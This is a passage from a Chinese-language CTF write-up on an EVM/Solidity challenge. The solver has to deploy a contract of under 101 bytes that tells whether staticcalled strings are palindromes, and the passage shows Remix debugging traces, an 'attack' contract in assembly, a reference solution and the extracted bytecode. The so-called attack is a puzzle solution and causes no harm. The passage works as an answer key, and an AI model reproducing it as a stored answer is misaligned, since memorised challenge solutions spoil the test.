class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>相当于调用test函数，参数为<code>uint256--32</code>，和<code>string--random_string(128)</code>，其中的string有两种生成方式，有一半为true，一半为false，其中true部分判断随机数是否大于0.5，为真将是<code>str=random_string(63)+random_string(1)+reversed(list(str))</code>，否则为<code>str=random_string(64)+reversed(list(str))</code>,false部分直接生成<code>random_string(63)</code></p>\n<p>自己运行一下看一看</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\"> True\na True\nab False\naba True\nparadigm False\ntattarrattat True\nQWTJSI421LTGK7DIPYTWCIOZKB72AUTWKC5VMG6S17TZ13UIAD5CZAIA1FJ0WGWBBWGW0JF1AIAZC5DAIU31ZT71S6GMV5CKWTUA27BKZOICWTYPID7KGTL124ISJTWQ True\nH7Q0SGZPXLBC8Y405032K9YOGC6LOHY2KOSV098P0WDV5OBNABI467OWJSQKXY971M97I3JHFBRR3TYH0BCQIJRB3CGU3XCZ1K43K1X2F5K4FWDBWC023A3YUUGM5K31 False\nSCEKU7670FB1B3TZDXP31MI2AGFZF3T56HATKRU7IEVVGVGZCWRKLCXE3BSJD06660DJSB3EXCLKRWCZGVGVVEI7URKTAH65T3FZFGA2IM13PXDZT3B1BF0767UKECS True\nQTFOQ4MOR53F3ZVAK3I54LR2NW68TNAVJS8S1PVCQS6LWSJDC3PFJU4CIDFV1G2MI4DKDBWYVPCO4X2DJFQLY76GZISGSRENMRG5M1SNW0ZA2INPMXWNE7O0ALD2Z972 False\nI9N053FHRKGJAZ38LHIPICM8TTKY5PAF45ND7OB513VLDIH10MF0UYANUB9V152KK251V9BUNAYU0FM01HIDLV315BO7DN54FAP5YKTT8MCIPIHL83ZAJGKRHF350N9I True\nMPCEVBOGX6KJ3DTA55FF572FTUHWE029DSI3L2546ESZPR1UVSUHM8KPZNPQ0Y6MJTQM6K1A9GS6KIMQ832WF5Z518272ZZ0VLYCL1ACRM0B993YPOZMLC9W9KQI81PK False\nQTUHXHFZKCSSVZ4KNM139MVJBJAL66BODI9I3XVGSMX2EM8JGJYXBFEAB76D6L2M2L6D67BAEFBXYJGJ8ME2XMSGVX3I9IDOB66LAJBJVM931MNK4ZVSSCKZFHXHUTQ True\nA5XJHVVKLGZQC3JIEVD8JFSOT9IPQ9WCEZ46JAIVOFIZDLQD1DRK5FJKBLULLCZAFLEVLP6YCOOXFYVGSAVGIYGJV8JHD3K5IFAGZIYIBVQPRW3ICD01O7OCUS34ZT24 False\nZ8OP27WJOVCNIBYVGKFJ2BCXSZ5HPLMJAZDN9E5JK03BOUBUPG6RK3VUB1JOGBWTWBGOJ1BUV3KR6GPUBUOB30KJ5E9NDZAJMLPH5ZSXCB2JFKGVYBINCVOJW72PO8Z True\n22JCMPM4MMYRH02XQAAXGW0QCRAYP8HLGRZG6A1WL868XBCFFNP585TJHVAGB0CZ53VZ1EB8RCVAP9ARPS1Z7I3O72KZ5OAPDL7DHBAXPA3KP3PPH7TNRLU7MB9NFE8S False<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>每次调用的返回值与bool值相等就可以完成挑战，清楚了整体流程，思考一下怎么进行攻击</p>\n<p>在remix中任意参数进行调用test函数，debug一下，执行到第一次staticcall时有以下内存值</p>\n<pre class=\"line-numbers language-json\" data-language=\"json\"><code class=\"language-json\">stack<span class=\"token operator\">:</span>\n<span class=\"token punctuation\">[</span>\n\t<span class=\"token string\">\"0x00000000000000000000000000000000000000000000000000000000002d5cc5\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token string\">\"0x0000000000000000000000005c9eb5d6a6c2c1b3efc52255c0b356f116f6f66d\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token string\">\"0x00000000000000000000000000000000000000000000000000000000000000c0\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token string\">\"0x0000000000000000000000000000000000000000000000000000000000000004\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token string\">\"0x00000000000000000000000000000000000000000000000000000000000000c0\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token string\">\"0x0000000000000000000000000000000000000000000000000000000000000020\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token string\">\"0x00000000000000000000000000000000000000000000000000000000000000c4\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token string\">\"0x000000000000000000000000000000000000000000000000000000003ca7255b\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token string\">\"0x0000000000000000000000005c9eb5d6a6c2c1b3efc52255c0b356f116f6f66d\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token string\">\"0x00000000000000000000000000000000000000000000000000000000000001c7\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token string\">\"0x0000000000000000000000000000000000000000000000000000000000000000\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token string\">\"0x0000000000000000000000000000000000000000000000000000000000000080\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token string\">\"0x00000000000000000000000000000000000000000000000000000000000000ae\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token string\">\"0x00000000000000000000000000000000000000000000000000000000f9fbd554\"</span>\n<span class=\"token punctuation\">]</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-json\" data-language=\"json\"><code class=\"language-json\">memory<span class=\"token operator\">:</span>\n<span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token property\">\"0x0\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"00000000000000000000000000000000\\t????????????????\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token property\">\"0x10\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"00000000000000000000000000000000\\t????????????????\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token property\">\"0x20\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"00000000000000000000000000000000\\t????????????????\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token property\">\"0x30\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"00000000000000000000000000000000\\t????????????????\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token property\">\"0x40\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"00000000000000000000000000000000\\t????????????????\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token property\">\"0x50\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"000000000000000000000000000000c0\\t????????????????\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token property\">\"0x60\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"00000000000000000000000000000000\\t????????????????\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token property\">\"0x70\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"00000000000000000000000000000000\\t????????????????\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token property\">\"0x80\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"00000000000000000000000000000000\\t????????????????\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token property\">\"0x90\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"00000000000000000000000000000003\\t????????????????\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token property\">\"0xa0\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"61626100000000000000000000000000\\taba?????????????\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token property\">\"0xb0\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"00000000000000000000000000000000\\t????????????????\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token property\">\"0xc0\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"3ca7255b000000000000000000000000\\t????????????????\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token property\">\"0xd0\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"00000000000000000000000000000000\\t????????????????\"</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>所以第一次staticcall的具体情况是<code>stasiccall(gas=0x2d5cc5,to=0x5c9eb5d6a6c2c1b3efc52255c0b356f116f6f66d,in=0xc0,insize=0x04,out=0xc0,outsize=0x20)</code></p>\n<p>calldata自然就是memory[0xc0:0xc0+4]也就是0x3ca7255b，根据当前执行判断一下，不难发现这个data就是fwd()的function selector，这样我们清楚了staticcall的结构，接下来看一下第二次stsiccall，得到数据如下</p>\n<pre class=\"line-numbers language-json\" data-language=\"json\"><code class=\"language-json\">stack<span class=\"token operator\">:</span>\n<span class=\"token punctuation\">[</span>\n\t<span class=\"token string\">\"0x00000000000000000000000000000000000000000000000000000000002d50ef\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token string\">\"0x0000000000000000000000000000000000000000000000000000000000000000\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token string\">\"0x00000000000000000000000000000000000000000000000000000000000000a0\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token string\">\"0x0000000000000000000000000000000000000000000000000000000000000003\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token string\">\"0x0000000000000000000000000000000000000000000000000000000000000000\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token string\">\"0x0000000000000000000000000000000000000000000000000000000000000000\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token string\">\"0x0000000000000000000000000000000000000000000000000000000000000000\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token string\">\"0x0000000000000000000000000000000000000000000000000000000000000000\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token string\">\"0x0000000000000000000000000000000000000000000000000000000000000080\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token string\">\"0x0000000000000000000000000000000000000000000000000000000000000000\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token string\">\"0x00000000000000000000000000000000000000000000000000000000000001c7\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token string\">\"0x0000000000000000000000000000000000000000000000000000000000000000\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token string\">\"0x0000000000000000000000000000000000000000000000000000000000000080\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token string\">\"0x00000000000000000000000000000000000000000000000000000000000000ae\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token string\">\"0x00000000000000000000000000000000000000000000000000000000f9fbd554\"</span>\n<span class=\"token punctuation\">]</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-json\" data-language=\"json\"><code class=\"language-json\">memory<span class=\"token operator\">:</span>\n<span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token property\">\"0x0\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"00000000000000000000000000000000\\t????????????????\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token property\">\"0x10\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"00000000000000000000000000000000\\t????????????????\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token property\">\"0x20\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"00000000000000000000000000000000\\t????????????????\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token property\">\"0x30\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"00000000000000000000000000000000\\t????????????????\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token property\">\"0x40\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"00000000000000000000000000000000\\t????????????????\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token property\">\"0x50\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"000000000000000000000000000000e0\\t????????????????\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token property\">\"0x60\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"00000000000000000000000000000000\\t????????????????\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token property\">\"0x70\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"00000000000000000000000000000000\\t????????????????\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token property\">\"0x80\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"00000000000000000000000000000000\\t????????????????\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token property\">\"0x90\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"00000000000000000000000000000003\\t????????????????\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token property\">\"0xa0\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"61626100000000000000000000000000\\taba?????????????\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token property\">\"0xb0\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"00000000000000000000000000000000\\t????????????????\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token property\">\"0xc0\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"0000000000000000000000006f16a4f3\\t????????????o???\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token property\">\"0xd0\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"43b671b610476c5dcb740e4c5afcbac1\\tC?q??Gl??t?LZ???\"</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>所以第二次staticcall调用具体为<code>stasiccall(gas=0x2d50ef,to=0x000000000000000000000000000000000000,in=0xa0,insize=0x03,out=0x00,outsize=0x00)</code></p>\n<p>calldata则为memory[0xa0:0xa0+3]也就是0x616261</p>\n<p>再根据之前的分析，我们知道，这个challenge的本意就是对于输入的string是否是回文进行判断，是则true，否则false，所以用100位bytecode写一个回文判断合约就好，构建合约如下：</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">atttack</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">fallback</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">external</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">assembly</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token function\">calldatacopy</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token function\">calldatasize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">let</span> left <span class=\"token operator\">:=</span> <span class=\"token number\">0x00</span>\n            <span class=\"token keyword\">let</span> right <span class=\"token operator\">:=</span> <span class=\"token function\">sub</span><span class=\"token punctuation\">(</span><span class=\"token function\">calldatasize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">for</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span> <span class=\"token function\">lt</span><span class=\"token punctuation\">(</span>left<span class=\"token punctuation\">,</span> right<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token keyword\">let</span> left_r <span class=\"token operator\">:=</span> <span class=\"token function\">shr</span><span class=\"token punctuation\">(</span><span class=\"token number\">248</span><span class=\"token punctuation\">,</span><span class=\"token function\">mload</span><span class=\"token punctuation\">(</span>left<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">let</span> right_r <span class=\"token operator\">:=</span> <span class=\"token function\">shr</span><span class=\"token punctuation\">(</span><span class=\"token number\">248</span><span class=\"token punctuation\">,</span><span class=\"token function\">mload</span><span class=\"token punctuation\">(</span>right<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">if</span> <span class=\"token function\">iszero</span><span class=\"token punctuation\">(</span><span class=\"token function\">eq</span><span class=\"token punctuation\">(</span>left_r<span class=\"token punctuation\">,</span> right_r<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                    <span class=\"token function\">mstore</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n                    <span class=\"token keyword\">return</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">&#125;</span>\n                left <span class=\"token operator\">:=</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>left<span class=\"token punctuation\">,</span><span class=\"token number\">0x01</span><span class=\"token punctuation\">)</span>\n                right <span class=\"token operator\">:=</span> <span class=\"token function\">sub</span><span class=\"token punctuation\">(</span>right<span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token function\">mstore</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">return</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>直接编译，opcode总共有174，显然不符合题目合约code.length &lt; 101的限制，所以我们需要自己用bytecode来实现相同功能</p>\n<p>由于自己实在是太菜，看一下标准答案进行一下参考吧😩</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token punctuation\">&#123;</span>           \n    <span class=\"token keyword\">let</span> i <span class=\"token operator\">:=</span> <span class=\"token function\">returndatasize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">let</span> m <span class=\"token operator\">:=</span> <span class=\"token function\">shr</span><span class=\"token punctuation\">(</span><span class=\"token function\">selfbalance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">calldatasize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">let</span> e <span class=\"token operator\">:=</span> <span class=\"token function\">sub</span><span class=\"token punctuation\">(</span><span class=\"token function\">calldatasize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">selfbalance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span> <span class=\"token function\">and</span><span class=\"token punctuation\">(</span>\n        <span class=\"token function\">eq</span><span class=\"token punctuation\">(</span><span class=\"token function\">shr</span><span class=\"token punctuation\">(</span><span class=\"token number\">248</span><span class=\"token punctuation\">,</span> <span class=\"token function\">calldataload</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">shr</span><span class=\"token punctuation\">(</span><span class=\"token number\">248</span><span class=\"token punctuation\">,</span> <span class=\"token function\">calldataload</span><span class=\"token punctuation\">(</span><span class=\"token function\">sub</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        <span class=\"token function\">lt</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> m<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>i <span class=\"token operator\">:=</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> <span class=\"token function\">selfbalance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span>\n    \n    <span class=\"token function\">mstore</span><span class=\"token punctuation\">(</span><span class=\"token function\">callvalue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">eq</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span><span class=\"token punctuation\">(</span><span class=\"token function\">callvalue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>由于deploy函数限制了code的长度，所以参考答案中这种写法是别有用意的，直接使用returndatasize，selfbalance即可避免多一次push操作，再用数据也可以直接dup，而不是重新push，节约了字节码(gas)</p>\n<p>自己用bytecode写合约实在是太难了，我们用一个巧办法得到合约的字节码，然后再进行一下分析理解</p>\n<p>写两个合约如下</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token comment\">//contract 1</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">attack</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">fallback</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">assembly</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">let</span> i <span class=\"token operator\">:=</span> <span class=\"token function\">returndatasize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">let</span> m <span class=\"token operator\">:=</span> <span class=\"token function\">shr</span><span class=\"token punctuation\">(</span><span class=\"token function\">selfbalance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">calldatasize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">let</span> e <span class=\"token operator\">:=</span> <span class=\"token function\">sub</span><span class=\"token punctuation\">(</span><span class=\"token function\">calldatasize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">selfbalance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">for</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span> <span class=\"token function\">and</span><span class=\"token punctuation\">(</span>\n                <span class=\"token function\">eq</span><span class=\"token punctuation\">(</span><span class=\"token function\">shr</span><span class=\"token punctuation\">(</span><span class=\"token number\">248</span><span class=\"token punctuation\">,</span> <span class=\"token function\">calldataload</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">shr</span><span class=\"token punctuation\">(</span><span class=\"token number\">248</span><span class=\"token punctuation\">,</span> <span class=\"token function\">calldataload</span><span class=\"token punctuation\">(</span><span class=\"token function\">sub</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                <span class=\"token function\">lt</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> m<span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>i <span class=\"token operator\">:=</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> <span class=\"token function\">selfbalance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span>\n            \n            <span class=\"token function\">mstore</span><span class=\"token punctuation\">(</span><span class=\"token function\">callvalue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">eq</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">return</span><span class=\"token punctuation\">(</span><span class=\"token function\">callvalue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token comment\">//contract 2</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">attack</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">fallback</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span><span class=\"token punctuation\">&#123;</span>\n       <span class=\"token keyword\">assembly</span><span class=\"token punctuation\">&#123;</span>\n       \n       <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>分别进行部署得到bytecode，对于大致一样的部分进行分割，再去对于核心逻辑进行分割，returndatasize的opcode是<code>0x3d</code>return的opcode是<code>0xf3</code>，获得到的bytecode中只含有一个<code>0x3d</code>以及两个<code>0xf3</code>根据两个合约大致一样的部分进行分割之后即可得到code（也可以这样理解，<code>0xf3</code>一定会在<code>0x3d</code>之后）得到bytecode如下</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">3d36471c4736035b8183108382033560f81c843560f81c14161560365747830192506018565b8183143452602034f3<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>倒置拼接之后发现并不正确，我们来仔细分析一下，首先来看一下deploy的合约的code是什么样的构造</p>\n<p>两次deploy我们用0xabcd和0x做参数，查看真正的部署的code的区别</p>\n<pre class=\"line-numbers language-json\" data-language=\"json\"><code class=\"language-json\">0x<span class=\"token operator\">:</span>\n0x608060405234801561001057600080fd5b506040516101a73803806101a7833981810160405281019061003291906100a2565b805160208201f35b600061004d61004884610114565b6100e3565b90508281526020810184848401111561006557600080fd5b610070848285610144565b509392505050565b600082601f83011261008957600080fd5b815161009984826020860161003a565b91505092915050565b6000602082840312156100b457600080fd5b600082015167ffffffffffffffff8111156100ce57600080fd5b6100da84828501610078565b91505092915050565b6000604051905081810181811067ffffffffffffffff8211171561010a57610109610177565b5b8060405250919050565b600067ffffffffffffffff82111561012f5761012e610177565b5b601f19601f8301169050602081019050919050565b60005b83811015610162578082015181840152602081019050610147565b83811115610171576000848401525b50505050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fdfe00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000\n0xabcd<span class=\"token 